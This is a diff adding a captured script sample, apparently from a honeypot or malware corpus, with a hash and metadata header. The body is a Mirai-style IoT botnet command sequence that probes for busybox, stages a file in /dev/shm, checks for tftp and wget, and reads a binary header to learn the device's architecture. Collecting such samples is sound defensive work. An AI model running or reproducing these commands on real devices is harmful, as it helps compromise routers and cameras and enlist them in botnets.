@@ -1,0 +1,20 @@
+# sha256: ae377be0670aa1f6b0dab94fc420d346475091d994829522483d1001805970cb
+# family: script_generic
+# kind: script
+# size_bytes: 254
+# first_seen: 2026-05-02 03:40:49.465394 UTC
+# times_seen: 1
+# yara_matches: none
+# ------------------------------------------------------------
+
+enable
+system
+shell
+sh
+cat /proc/mounts; /bin/busybox IJYWS
+cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox IJYWS
+tftp; wget; /bin/busybox IJYWS
+dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s
+/bin/busybox IJYWS
+rm .s; exit
+q
